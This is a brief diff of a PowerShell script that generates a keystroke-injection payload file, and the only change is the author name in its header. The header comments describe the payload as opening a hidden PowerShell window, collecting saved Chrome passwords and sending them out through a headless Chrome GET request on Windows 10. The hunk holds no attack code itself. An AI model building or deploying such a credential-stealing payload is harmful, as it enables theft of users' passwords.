@@ -5,7 +5,7 @@ $script = Get-Content -Raw $scriptFileName
 $outputFile = "payload.txt"
 
 "REM Title: Chrome Exfil",
-"REM Author: Robert Wallhead",
+"REM Author: thisismyrobot",
 "REM Description: Opens hidden powershell, grabs Chrome passwords, exfils via headless Chrome GET request.",
 "REM Target: Windows 10 (Powershell + Chrome)",
 "REM Version: 1.0",
